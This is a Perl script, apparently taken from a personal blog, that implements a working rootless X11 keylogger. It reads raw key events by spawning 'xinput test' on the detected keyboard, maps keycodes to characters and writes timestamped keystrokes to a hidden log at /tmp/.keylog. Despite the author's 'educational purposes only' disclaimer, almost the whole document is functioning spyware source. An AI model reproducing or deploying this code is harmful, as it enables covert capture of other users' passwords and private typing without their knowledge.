#!/usr/bin/perl -w
# source: http://www.kirsle.net/blog/kirsle/building-a-better-keylogger

# keylog2 - a rootless keylogger that only requires an X server and the xinput
# command (provided by xorg-x11-apps on Fedora). You'll also need to install
# the Perl module IO::Pty::Easy.
#
# Unlike my first keylogger proof-of-concept, this one doesn't require root
# privileges because it just uses the X Window System. Therefore it only
# catches key inputs made to graphical programs on the same X server that the
# keylogger runs on.
#
# How it works: running `xinput list` lists all your X input devices. There's
# a keyboard device named "AT (something)", mine is "AT Translated Set 2
# keyboard". Get the ID from the line that says this and then run
# `xinput test <id>` and it will start dumping keystroke information as the
# user types keys into ANY graphical app.
#
# I mapped the QWERTY keyboard set using my own keyboard by trial-and-error,
# so no guarantees it will work for everybody. This is just another proof of
# concept anyway, and shouldn't be used for malicious purposes.
#
# Under the default configuration, the log file is written to /tmp/.keylog
# and only logs key release events, except for modifier keys (Shift, Ctrl,
# Alt, and Super (Windows key)) where it will also log the Key Down event
# (so Alt-Tabbing makes more sense in the log, for example). You can
# optionally configure it to log EVERY key down event if you'd like, though.
#
# Again, this is just a proof of concept and should be used for educational
# purposes only, and not for anything malicious.
#
# --Kirsle
# http://sh.kirsle.net/

use strict;
use warnings;
use IO::Pty::Easy;
use IO::Handle;

##########################
# Configuration          #
##########################

my $conf = {
# Log files to write keys to
    logfile => "/tmp/.keylog",

# By default only key-releases are logged. Log key-presses too?
    #log_keydown => 0,
    log_keydown => 1,
};

##########################
# End Configuration      #
##########################

# X11 display.
$ENV{DISPLAY} ||= ":0.0";

# Make sure we have xinput.
if (system("which xinput > /dev/null") != 0) {
    print "You require the `xinput` command for this keylogger to work.\n";
    exit(1);
}

# Get the input list.
my @inputs = `xinput list`;

# Find the AT keyboard.
my $id;
foreach my $line (@inputs) {
    $line =~ s/^[\s\t]+//g;
    $line =~ s/[\s\t]+$//g;
    $line =~ s/[\x0D\x0A]+//g;
    next unless length $line;
    if ($line =~ /keyboard/i && $line =~ /. AT/) {
        ($id) = ($line =~ /id=(\d+)/)[0];
    }
}
if (!defined $id) {
    print "Failed to find \"AT\" keyboard ID from `xinput list`!\n";
    exit(1);
}

print "Keyboard ID: $id\n";

# Track state of modifier keys.
our %mod = (
        'shift' => 0,
        'ctrl'  => 0,
        'alt'   => 0,
        'super' => 0,
        );

# Begin watching. Make a pseudo TTY for this so xinput believes we're a shell.
my $tty = IO::Pty::Easy->new();
print "Watching `xinput test $id`\n";
$tty->spawn("xinput test $id");

while ($tty->is_active) {
    my $data = $tty->read();
    my @lines = split(/\n/, $data);
    foreach my $line (@lines) {
# Key event?
        chomp $line;
        if ($line =~ /^key\s+(press|release)\s+(\d+)\s*?$/i) {
            event($1, $2);
        }
    }
}

# Handle key events
sub event {
    my ($event,$sym) = @_;

# Only QWERTY keyboards supported.
    my $key = kbd_qwerty($event,$sym);

    print "[$sym] $event: " . ($key eq " " ? "{space}" : $key) . "\n";

# Log it?
    if ($event eq "release" || ($event eq "press" && $conf->{log_keydown}) ||
            ($key =~ /^\{(Shift|Ctrl|Alt|Super)\}$/)) {
        my @time = localtime(time());
        my $ts = join(" ",
                join("-",
                    sprintf("%4d", $time[5] + 1900),
                    sprintf("%2d", $time[4] + 1),
                    sprintf("%2d", $time[3]),
                    ),
                join(":",
                    sprintf("%2d", $time[2]),
                    sprintf("%2d", $time[1]),
                    sprintf("%2d", $time[0]),
                    ),
                );

        open (my $log, ">>", $conf->{logfile});
        print $log "[$ts] "
            . ($event eq "release" ? "<Release>" : "<Press>")
            . " "
            . ($key eq " " ? "{space}" : $key)
            . "\n";
        close ($log);
    }
}

# QWERTY keysym finder
sub kbd_qwerty {
    my ($event,$sym) = @_;

# Modifier keys.
    my %modkeys = (
            50  => 'shift', # L Shift
            62  => 'shift', # R Shift
            37  => 'ctrl',  # L Ctrl
            105 => 'ctrl',  # R Ctrl
            64  => 'alt',   # L Alt
            108 => 'alt',   # R Alt
            133 => 'super', # L Super
            );
    if (exists $modkeys{$sym}) {
        my $name = $modkeys{$sym};
        $mod{$name} = $event eq "press" ? 1 : 0;
        return "{\u$name}";
    }

# Qwerty keys.
    my %keys = (
# qwerty row
            24 => [ 'q', 'Q' ], # normal, shift key
            25 => [ 'w', 'W' ],
            26 => [ 'e', 'E' ],
            27 => [ 'r', 'R' ],
            28 => [ 't', 'T' ],
            29 => [ 'y', 'Y' ],
            30 => [ 'u', 'U' ],
            31 => [ 'i', 'I' ],
            32 => [ 'o', 'O' ],
            33 => [ 'p', 'P' ],
            34 => [ '[', '{' ],
            35 => [ ']', '}' ],
            51 => [ "\\", '|' ],

# asdf row
            38 => [ 'a', 'A' ],
            39 => [ 's', 'S' ],
            40 => [ 'd', 'D' ],
            41 => [ 'f', 'F' ],
            42 => [ 'g', 'G' ],
            43 => [ 'h', 'H' ],
            44 => [ 'j', 'J' ],
            45 => [ 'k', 'K' ],
            46 => [ 'l', 'L' ],
            47 => [ ';', ':' ],
            48 => [ '"', "'" ],
            36 => "{Return}",

# zxcv row
            52 => [ 'z', 'Z' ],
            53 => [ 'x', 'X' ],
            54 => [ 'c', 'C' ],
            55 => [ 'v', 'V' ],
            56 => [ 'b', 'B' ],
            57 => [ 'n', 'N' ],
            58 => [ 'm', 'M' ],
            59 => [ ',', '<' ],
            60 => [ '.', '>' ],
            61 => [ '/', '?' ],

# number row
            49 => [ '`', '~' ],
            10 => [ '1', '!' ],
            11 => [ '2', '@' ],
            12 => [ '3', '#' ],
            13 => [ '4', '$' ],
            14 => [ '5', '%' ],
            15 => [ '6', '^' ],
            16 => [ '7', '&' ],
            17 => [ '8', '*' ],
            18 => [ '9', '(' ],
            19 => [ '0', ')' ],
            20 => [ '-', '_' ],
            21 => [ '+', '=' ],

# space bar
            65 => ' ',

# number pad
            90 => '{Num-0}',
            87 => '{Num-1}',
            88 => '{Num-2}',
            89 => '{Num-3}',
            83 => '{Num-4}',
            84 => '{Num-5}',
            85 => '{Num-6}',
            79 => '{Num-7}',
            80 => '{Num-8}',
            81 => '{Num-9}',
            106 => '{Num-/}',
            63  => '{Num-*}',
            82  => '{Num--}',
            86  => '{Num-+}',

# F keys
            67 => '{F1}',
            68 => '{F2}',
            69 => '{F3}',
            70 => '{F4}',
            71 => '{F5}',
            72 => '{F6}',
            73 => '{F7}',
            74 => '{F8}',
            75 => '{F9}',
            76 => '{F10}',
            95 => '{F11}',
            96 => '{F12}',

# Misc
            9  => '{Esc}',
            22 => '{Backspace}',
            77 => '{Num Lock}',
            107 => '{Print Scr}',
            118 => '{Insert}',
            119 => '{Delete}',
            110 => '{Home}',
            112 => '{Pg Up}',
            117 => '{Pg Dn}',
            115 => '{End}',
            111 => '{Up}',
            116 => '{Down}',
            113 => '{Left}',
            114 => '{Right}',
            135 => '{Menu}',
            23  => '{Tab}',
            66  => '{Caps Lock}',
            );

    if (exists $keys{$sym}) {
        if (ref($keys{$sym})) {
            print "(shift key: $mod{shift})\n";
            if ($mod{shift}) {
                return $keys{$sym}->[1];
            }
            else {
                return $keys{$sym}->[0];
            }
        }
        return $keys{$sym};
    }
    else {
        return "{Unknown: $sym}";
    }
}

[feedly mini]
